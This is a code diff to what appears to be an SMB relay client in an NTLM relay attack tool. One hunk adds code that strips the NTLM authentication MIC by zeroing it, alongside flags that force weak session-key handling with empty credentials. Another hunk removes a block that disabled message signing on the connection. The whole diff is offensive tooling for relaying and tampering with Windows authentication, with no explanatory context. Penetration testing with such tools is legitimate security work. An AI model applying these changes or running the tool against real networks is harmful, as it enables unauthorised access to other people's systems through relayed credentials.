@@ -707,7 +707,10 @@ class SMBRelayClient(ProtocolClient):
                 authMessage['flags'] |= NTLMSSP_REQUEST_NON_NT_SESSION_KEY
                 LOG.debug('[SMB] sendAuth: Added NON_NT_SESSION_KEY flag')
 
-            # Keep MIC intact - do NOT zero out MIC field
+            # Strip MIC field (zero it out)
+            authMessage['MIC'] = b'\x00' * 16
+            LOG.debug('[SMB] sendAuth: Stripped MIC field (zeroed out)')
+
             LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, using legacy/weak flags' % authMessage['flags'])
 
             # Try to extract/derive session key for SMB operations
@@ -803,13 +806,6 @@ class SMBRelayClient(ProtocolClient):
                 calculated_key = LMOWFv1('', '')[:8] + b'\x00'*8
                 LOG.debug('[SMB] sendAuth: Calculated session key for NON_NT_SESSION_KEY with empty credentials: %s' % calculated_key.hex())
                 self.session._SMBConnection.set_session_key(calculated_key)
-
-                # Also explicitly disable signing requirement on the connection
-                try:
-                    self.session._SMBConnection._Connection['RequireMessageSigning'] = False
-                    LOG.debug('[SMB] sendAuth: Disabled RequireMessageSigning on connection')
-                except Exception as e:
-                    LOG.debug('[SMB] sendAuth: Could not disable RequireMessageSigning: %s' % str(e))
 
         return token, errorCode
 
